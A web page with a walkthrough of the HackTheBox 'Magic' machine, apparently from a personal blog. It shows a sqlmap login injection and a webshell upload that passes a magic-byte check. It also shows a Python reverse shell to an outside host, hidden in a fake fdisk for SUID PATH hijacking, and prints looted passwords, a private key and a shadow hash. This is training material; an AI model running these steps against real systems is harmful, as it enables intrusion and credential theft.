<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Magic | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,medium"><meta name=description content="Magic HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/magic/><link crossorigin=anonymous href=/assets/css/stylesheet.35b906a90813b2766df33de5f84bf4610918496b745304c45e387646ed743bea.css integrity="sha256-NbkGqQgTsnZt8z3l+Ev0YQkYSWt0UwTEXjh2Ru10O+o=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/magic/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Magic "><meta property="og:description" content="Magic HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/magic/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/magic/magic.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-08-21T00:00:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/magic/magic.png"><meta name=twitter:title content="Magic "><meta name=twitter:description content="Magic HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Magic ","item":"https://s4ch.github.io/writeups/hackthebox/magic/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Magic ","name":"Magic ","description":"Magic HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","medium"],"articleBody":"Information Name: Magic Profile: www.hackthebox.eu Difficulty: Medium OS: Linux Points: 30 Overview TL;DR: SQLi, webshell upload with bypass, pe via SUID tool using unsecured PATH.\nInstall tools used in this WU on BlackArch Linux:\n1 pacman -S nmap sqlmap haiti weevely metasploit pwncat Network enumeration With a nmap scan be can see only 2 open ports: 80 \u0026 22.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Nmap 7.80 scan initiated Fri Jun 12 13:15:34 2020 as: nmap -sSVC -p- -oA nmap_full 10.10.10.185 Nmap scan report for 10.10.10.185 Host is up (0.021s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA) | 256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA) |_ 256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Magic Portfolio Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jun 12 13:16:00 2020 -- 1 IP address (1 host up) scanned in 25.72 seconds HTTP Enumeration Quickly we found a few pages:\nhttp://10.10.10.185/index.php http://10.10.10.185/login.php http://10.10.10.185/upload.php (authenticated) On the login page we can see we have a different behavior when we put of quote in the username or password and when not. So let’s try a SQLi.\nSQL Injection I used sqlmap to quickly identify the injection technique and automate the process.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 $ sqlmap -u http://10.10.10.185/login.php --method POST --data 'username=admin\u0026password=password' --level 3 --risk 3 ... sqlmap identified the following injection point(s) with a total of 628 HTTP(s) requests: --- Parameter: password (POST) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause Payload: username=admin\u0026password=-2142' OR 8380=8380-- HhVJ Parameter: username (POST) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause Payload: username=-5412' OR 2974=2974-- buTK\u0026password=password --- there were multiple injection points, please select the one to use for following injections: [0] place: POST, parameter: username, type: Single quoted string (default) [1] place: POST, parameter: password, type: Single quoted string [q] Quit \u003e 0 [15:38:07] [INFO] testing MySQL [15:38:07] [INFO] confirming MySQL [15:38:07] [INFO] the back-end DBMS is MySQL back-end DBMS: MySQL \u003e= 5.0.0 [15:38:07] [INFO] fetched data logged to text files under '/home/cyfun/.sqlmap/output/10.10.10.185' Nice we have 2 injection points for our OR boolean-based blind SQL injection.\nNow I’ll some options to get more information:\n--current-user -\u003e theseus@localhost --current-db -\u003e Magic --hostname -\u003e ubuntu --is-dba -\u003e False --tables -D Magic -\u003e login -D Magic -T login --columns -\u003e 1 2 3 4 5 6 7 +----------+--------------+ | Column | Type | +----------+--------------+ | id | int(6) | | password | varchar(100) | | username | varchar(50) | +----------+--------------+ -D Magic -T login --dump -\u003e 1 2 3 4 5 +------+----------+----------------+ | id | username | password | +------+----------+----------------+ | 1 | admin | Th3s3usW4sK1ng | +------+----------+----------------+ Note: We could have done a dump directly but that would have been dirty and far less efficient if there were more databases, tables, entries, etc. Also we probably didn’t needed to dump the password, we could have just bypass the authentication. But the password may be reused somewhere else and there could have been more stuff in the DB.\nFile upload We are now redirected to the upload page.\nOnly jpg, jpeg and png extensions are allowed.\nIf we upload a legit image, we receive a message: The file hacker_logo.jpg has been uploaded..\nLet’s go back to the index to see if our logo is listed there.\nThe image is uploaded here: http://10.10.10.185/images/uploads/hacker_logo.jpg\nAnd have a weird title: 14331a21.\nI check if it can be a digest with :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ haiti 14331a21 Adler-32 CRC-32B FCS-32 GHash-32-3 GHash-32-5 FNV-132 Fletcher-32 Joaat ELF-32 XOR-32 CRC-32 [JtR: crc32] Microsoft Outlook PST Dahua [JtR: dahua] The most probable option is CRC32.\nSo I tried to see if it could be the CRC32 of the filename with an online service.\nBut it seems not.\nIt could be the CRC32 of the file itself but before using more guessing let’s upload the same file again with the same name to see if the title is not random.\nIt replaced the previous image but is now entitled 806a94c.\nSo the title seems to be random, so no need to try to calculate it.\nSo let’s see if we can simply bypass something to upload a PHP file.\nI generated a [weevely][weevely] agent (PHP webshell):\n1 2 $ weevely generate cyfun agentcyfun.php Generated 'agentcyfun.php' with password 'cyfun' of 761 byte size. I tried to upload the shell without changing the Content-Type and just changing the name to agentcyfun.php.png and received the following message that suggested I was spotted:\n1 What are you trying to do there? But changing the Content-Type from application/x-php to application/x-php didn’t change anything.\nThe name Magic is maybe because there is a magic bytes check and this message is displayed when content type, extension and magic byte don’t match.\nLet’s check the signature of jpeg and png:\n1 2 3 4 $ xxd -l 12 ~/Pictures/hacker_logo.jpg 00000000: ffd8 ffe0 0010 4a46 4946 0001 ......JFIF.. $ xxd -l 8 ~/Pictures/rawsec/logo5_50x40.png 00000000: 8950 4e47 0d0a 1a0a .PNG.... We can also check the list on Wikipedia because jpeg supports 2 other signatures.\nWe can store the signatures in files:\n1 2 $ echo -n \"\\x89\\x50\\x4e\\x47\\x0d\\x0a\\x1a\\x0a\" \u003e png_signature $ echo -n \"\\xff\\xd8\\xff\\xe0\\x00\\x10\\x4a\\x46\\x49\\x46\\x00\\x01\" \u003e jpg_signature Then let’s try to prepend the PNG signature to the webshell.\n1 2 $ cat png_signature agentcyfun.php \u003e agent_png.png $ cat jpg_signature agentcyfun.php \u003e agent_jpg.jpg Let’s upload again, this time we are not spotted. The image is successfully uploaded to http://10.10.10.185/images/uploads/agent_png.png but as it is served as a png, the PHP is not interpreted. Let’s see if we send a png extension and a php Content-Type.\nThis is accepted too. But it is still served as a png. I’ll try to put a php extension but I think we will be caught by the extension whitelist. Indeed we were spotted.\nSo let’s try the double extension (.png.php) -\u003e spotted. Let’s try a null byte injection (.php\\00.png) even if I don’t believe it will works.\nIt tells me 00.png was uploaded (http://10.10.10.185/images/uploads/00.png) but it’s served as png. Let’s see if agent_png.php was created (http://10.10.10.185/images/uploads/agent_png.php): no.\nWhat if we try the double extension without null byte but in the other way (.php.png). It seems http://10.10.10.185/images/uploads/agent_png.php.png is interpreted as PHP!\nWebshell 1 2 3 4 5 6 7 8 9 10 11 12 13 $ weevely terminal http://10.10.10.185/images/uploads/agent_png.php.png cyfun [+] weevely 4.0.1 [+] Target: 10.10.10.185 [+] Session: /home/cyfun/.weevely/sessions/10.10.10.185/agent_png.php_0.session [+] Browse the filesystem or execute commands starts the connection [+] to the target. Type :help for more information. weevely\u003e id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@ubuntu:/var/www/Magic/images/uploads $ The issue is that the webshell is removed a few seconds after being uploaded. So we’ll have to use a PHP dropper to get a rverse shell immediately.\nWe could craft one with msfvenom (from [Metasploit][msf]) but weevely have a bunch of useful modules like this one:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 www-data@ubuntu:/var/www/Magic/images/uploads $ :backdoor_reversetcp -h usage: backdoor_reversetcp [-h] [-shell SHELL] [-no-autonnect] [-vector {netcat_bsd,netcat,python,devtcp,perl,ruby,telnet,python_pty}] lhost port Execute a reverse TCP shell. positional arguments: lhost Local host port Port to spawn optional arguments: -h, --help show this help message and exit -shell SHELL Specify shell -no-autonnect Skip autoconnect -vector {netcat_bsd,netcat,python,devtcp,perl,ruby,telnet,python_pty} Note: for OSCP it’s also good to know how to do without [Metasploit][msf].\nI start a [pwncat] listener on my machine:\n1 $ pwncat -l 8888 Re-uploaded my webshell, executed it and launched the reverse shell module:\n1 weevely\u003e :backdoor_reversetcp 10.10.15.18 8888 Nice, I have a true shell that I won’t lost on my [pwncat][pwncat] listener:\n1 2 3 4 $ pwncat -l 8888 /bin/sh: 0: can't access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) Privilege Escalation : www-data to theseus We can just connect by re-using the credentials we looted during the SQLi.\n1 2 3 4 5 6 7 8 9 $ python3 -c \"import pty;pty.spawn('/bin/bash')\" www-data@ubuntu:/var/www/Magic/images/uploads$ ls /home theseus www-data@ubuntu:/var/www/Magic/images/uploads$ su theseus Password: Th3s3usW4sK1ng theseus@ubuntu:/var/www/Magic/images/uploads$ id uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users) But there was another method for those who just used an authentication bypass instead of dumping the database.\nFind the database credentials:\n1 2 3 4 5 6 7 8 9 10 11 12 13 theseus@ubuntu:/var/www/Magic/images/uploads$ ls ../.. assets images login.php sql.php sql_v3.php db.php5 index.php logout.php sql_v2.php upload.php theseus@ubuntu:/var/www/Magic/images/uploads$ cat ../../db.php5 \u003c?php class Database { private static $dbName = 'Magic' ; private static $dbHost = 'localhost' ; private static $dbUsername = 'theseus'; private static $dbUserPassword = 'iamkingtheseus'; ... And then dump the database:\n1 2 3 4 $ mysqldump --databases Magic -utheseus -piamkingtheseus ... INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng'); ... And then log in with su too.\nThen let’s loot the flag and copy the private key, so if the box is reset we can start back from here instead of playing with the reverse shell again.\n1 2 3 4 theseus@ubuntu:~$ cat user.txt 1a1fa3ca1d83a1b0dd709cdcbdb15df0 theseus@ubuntu:~$ cat .ssh/id_rsa .ssh/id_rsa\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 -----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKCAQEA6ruVQANqao9pxNJ2g5XkHkyMq5zOCoTlJwTVlkO6HS0X9edW EYbRuvDeBIaG9jQ3S2Kp7wWxKnP9TBU2Yd8sAwdjXN4qa4ePGLiRWaI76A3X5Mtu TFRzi7/hUrBuO+MhFMgVlkBCDSf9P9JGLFS+9xqAbbi3Jx+MTKjIR7rkkmPJITvj wuI5h+fGK1e1OkJ8MGjTlDuHWpVHpixgY07shz5FlXsnUx79y7ZSQZu7XZbEgw3I jnZUppKZKXW2vvswDzRQkbwJnRRVNBIKww6IvDLKS0bdvtrVJEh5g+IJT98TNLV1 eLjVjimmFhv8Zg4YM2cdXtDIUezy+GPgCATbSQIDAQABAoIBAA5cz/MMwnQmtkgO wKWohD6+XFUb0Refrg3HI/J/zmF+otqu/vsvjqGrn0oTmSpzY3a/YLp5VK/OTQ9c tOkkKKM+znueNGZD8yOGF46ueI/oWO9s6yDMgg1o/jZ7CSOs8Bc/buK0p9X6Pmqr SRPpU433FyifhsVkDseaBDcvXlD+oA1AMuoUv7RW+6YEgPLQK+GJqW9qClqJl72A ZcwLHV2pEDP8q/r5z+6liUWYZSf9VMjtsB7P7DYLatFb/iXPgMzPl3Ee3K69e7vu 0H56M6pFfnwBmi9/j7SfWsOkiNH+SCCi9OIcDnSytW1Qvs5L2su5TQ19A8gZps9x uOVt4ikCgYEA+RlW8d4QmCGlQD5AdkvxOXHCKkF97z88yRBIfMV+/oNz8IL67QJ2 fJP71SK8/K3xulmSouaMExmd9hD7soLkyNOr5ek0hEZ2tTnlMEGcqvzf/LPeDx7q eFlxn1Ls+u6Jmbr/gyl6kMzpCia+l5K+Azu4ONLRbTQADPDOg1BFbBsCgYEA8Txa 6VJDR7KyX0165yFReMWz4MuwEyd6kUjjzmSuQn1xWPacUdSxgxqGBGPWx9rFCcMt tKBhD8HW1RjO0/vi6K5K/Gygr8D2lpDuY+92EhD3FHx2lZveibloMTS0a42ySm4m dsYuhxnJ26VtN/FnQAXZfRM1B0mALx7qP4h0xGsCgYAyDseMH2YSTGCbAmeN3kEB nDy6pSKbm4epmB4ZBM86ckwwPwIR8vbAnjRzZmG4HXSAUFPJbK8lf3Zg5pTOEMPN H8xhjXXCRy6/yHyoL+c97UdNzw+G1l2kBcVxkQaSfrEkNZH3V7SLuMH0CkkuyIxq teuVb7gqS9Lext2ZQd5RlQKBgGxvl+H3Y1zQO5PRTSSl+mxSWif7Bzuk7FhwLk5x PU+P+apmuB+kfuKSwpkok7wkX5uiy2G9EcQ2eq4xR49MU1QKPJS484XtNCq8HRx4 4FcAnz/rLpbTiLXZzLcJnOwXtoP0fX+4V+PMuMrt0mlqLuI9fuTVBGoxJNiJifxj BzHfAoGARjeDy+yQSUUwUbrFMbyWhNnX8fef4h4lGmlZTZTjC5tL1tOQ3/QPvgnp I9Esc9FP8QLqR3jJOdijaN59oByGFiEE1QGnODeHRt2czK388XtH/FTqsjhH360R +8ylF6696X9DMnUQ4NEvDRRLR7JKae8fcu5d/SRsenB+1ck2djs= -----END RSA PRIVATE KEY----- So we can login through SSH now:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 $ chmod 600 id_rsa $ ssh theseus@10.10.10.185 -i id_rsa load pubkey \"id_rsa\": invalid format Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.3.0-42-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch 29 packages can be updated. 0 updates are security updates. Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Your Hardware Enablement Stack (HWE) is supported until April 2023. Last login: Thu Jul 2 08:19:49 2020 from 10.10.15.71 theseus@ubuntu:~$ Note: is you are denied it’s because someone overwrote authorized_keys with it’s personal key. So just append theseus public key:\n1 theseus@ubuntu:~$ cat .ssh/id_rsa.pub \u003e\u003e .ssh/authorized_keys PS: it seems the private key I used was not part of the box but generated by another player, anyway you’ll have to add a key to .ssh/authorized_keys.\nSystem enumeration Let’s find binaries with SUID:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 theseus@ubuntu:~$ find / -perm -u=s -type f 2\u003e/dev/null /usr/sbin/pppd /usr/bin/newgrp /usr/bin/passwd /usr/bin/chfn /usr/bin/gpasswd /usr/bin/sudo /usr/bin/pkexec /usr/bin/chsh /usr/bin/traceroute6.iputils /usr/bin/arping /usr/bin/vmware-user-suid-wrapper ... /bin/umount /bin/fusermount /bin/sysinfo /bin/mount /bin/su /bin/ping /bin/sysinfo looks unusual:\n1 2 theseus@ubuntu:~$ ls -lh /bin/sysinfo -rwsr-x--- 1 root users 22K Oct 21 2019 /bin/sysinfo Privilege Escalation : theseus to root If we run sysinfo there are 4 sections that seems to match so other system commands:\nHardware Info: lshw -short Disk Info: fdisk -l CPU Info: cat /proc/cpuinfo MEM Usage: free -h So basically what we have to do is change the PATH env var to force the SUID sysinfo to call an attacker controlled binary instead of the system tools.\n1 2 3 4 5 6 7 8 9 10 $ mkdir /tmp/cyfun $ cd /tmp/cyfun $ touch fdisk $ vi fdisk $ chmod +x fdisk $ export PATH=/tmp/cyfun:$PATH $ echo $PATH /tmp/cyfun:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin $ which fdisk /tmp/cyfun/fdisk Here is the reverse shell I put in fdisk:\n1 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.15.32\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' The we just have to run sysinfo to get the root shell:\n1 2 3 4 5 6 7 8 $ pwncat -l 8888 -v # pwd /tmp/cyfun # cd /root # cat root.txt 8b6a4fda49b7bcfe0ed6b1925d45bd96 # cat /etc/shadow | grep root root:$6$P9JXkqrh$tQfL.bHaQQmi7tBxwKp2wdSTB0D19Q.PHM.8tdLanqBEs70cKzul4SEY0PqfbxVkUv7bR5wrKYXJlb0p69c42.:18184:0:99999:7::: : [weevely]:https://github.com/epinna/weevely3 [msf]:https://www.metasploit.com/ [pwncat]:https://pwncat.org/\n","wordCount":"2008","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/magic/magic.png","datePublished":"2020-08-21T00:00:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/magic/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Magic</h1><div class=post-description>Magic HackTheBox writeup</div><div class=post-meta><span title='2020-08-21 00:00:00 +0000 UTC'>August 21, 2020</span>&nbsp;·&nbsp;10 min&nbsp;·&nbsp;2008 words&nbsp;·&nbsp;
<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
,
<a href=https://s4ch.github.io/tags/hackthebox/ class=post-tag title=hackthebox>hackthebox</a>
,
<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
,
<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
,
<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
,
<a href=https://s4ch.github.io/tags/medium/ class=post-tag title=medium>medium</a>
&nbsp;·&nbsp;
<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/magic/magic.png alt="Magic HackTheBox Machine"><p>Magic - Medium Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#http-enumeration>HTTP Enumeration</a></li><li><a href=#sql-injection>SQL Injection</a></li><li><a href=#file-upload>File upload</a></li><li><a href=#webshell>Webshell</a></li><li><a href=#privilege-escalation--www-data-to-theseus>Privilege Escalation : www-data to theseus</a></li><li><a href=#system-enumeration>System enumeration</a></li><li><a href=#privilege-escalation--theseus-to-root>Privilege Escalation : theseus to root</a></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> Magic</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/241>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Medium</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 30</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p><strong>TL;DR</strong>: SQLi, webshell upload with bypass, pe via SUID tool using unsecured
PATH.</p><p>Install tools used in this WU on BlackArch Linux:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>pacman -S nmap sqlmap haiti weevely metasploit pwncat
</span></span></code></pre></td></tr></table></div></div><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><p>With a <a href=https://nmap.org/>nmap</a> scan be can see only 2 open ports: 80 & 22.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Nmap 7.80 scan initiated Fri Jun 12 13:15:34 2020 as: nmap -sSVC -p- -oA nmap_full 10.10.10.185
</span></span><span class=line><span class=cl>Nmap scan report for 10.10.10.185
</span></span><span class=line><span class=cl>Host is up (0.021s latency).
</span></span><span class=line><span class=cl>Not shown: 65533 closed ports
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
</span></span><span class=line><span class=cl>| ssh-hostkey:
</span></span><span class=line><span class=cl>|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
</span></span><span class=line><span class=cl>|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
</span></span><span class=line><span class=cl>|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
</span></span><span class=line><span class=cl>|_http-server-header: Apache/2.4.29 (Ubuntu)
</span></span><span class=line><span class=cl>|_http-title: Magic Portfolio
</span></span><span class=line><span class=cl>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl># Nmap done at Fri Jun 12 13:16:00 2020 -- 1 IP address (1 host up) scanned in 25.72 seconds
</span></span></code></pre></td></tr></table></div></div><h2 id=http-enumeration>HTTP Enumeration<a hidden class=anchor aria-hidden=true href=#http-enumeration>#</a></h2><p>Quickly we found a few pages:</p><ul><li>http://10.10.10.185/index.php</li><li>http://10.10.10.185/login.php</li><li>http://10.10.10.185/upload.php (authenticated)</li></ul><p>On the login page we can see we have a different behavior when we put of quote
in the username or password and when not. So let&rsquo;s try a SQLi.</p><h2 id=sql-injection>SQL Injection<a hidden class=anchor aria-hidden=true href=#sql-injection>#</a></h2><p>I used <a href=https://sqlmap.org>sqlmap</a> to quickly identify the injection technique and automate the process.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>sqlmap</span> <span class=o>-</span><span class=n>u</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>10.185</span><span class=o>/</span><span class=n>login</span><span class=o>.</span><span class=n>php</span> <span class=o>--</span><span class=n>method</span> <span class=n>POST</span> <span class=o>--</span><span class=n>data</span> <span class=s1>&#39;username=admin&amp;password=password&#39;</span> <span class=o>--</span><span class=n>level</span> <span class=mi>3</span> <span class=o>--</span><span class=n>risk</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=n>sqlmap</span> <span class=n>identified</span> <span class=n>the</span> <span class=n>following</span> <span class=n>injection</span> <span class=n>point</span><span class=p>(</span><span class=n>s</span><span class=p>)</span> <span class=n>with</span> <span class=n>a</span> <span class=n>total</span> <span class=n>of</span> <span class=mi>628</span> <span class=n>HTTP</span><span class=p>(</span><span class=n>s</span><span class=p>)</span> <span class=n>requests</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=o>---</span>
</span></span><span class=line><span class=cl><span class=n>Parameter</span><span class=p>:</span> <span class=n>password</span> <span class=p>(</span><span class=n>POST</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>Type</span><span class=p>:</span> <span class=n>boolean</span><span class=o>-</span><span class=n>based</span> <span class=n>blind</span>
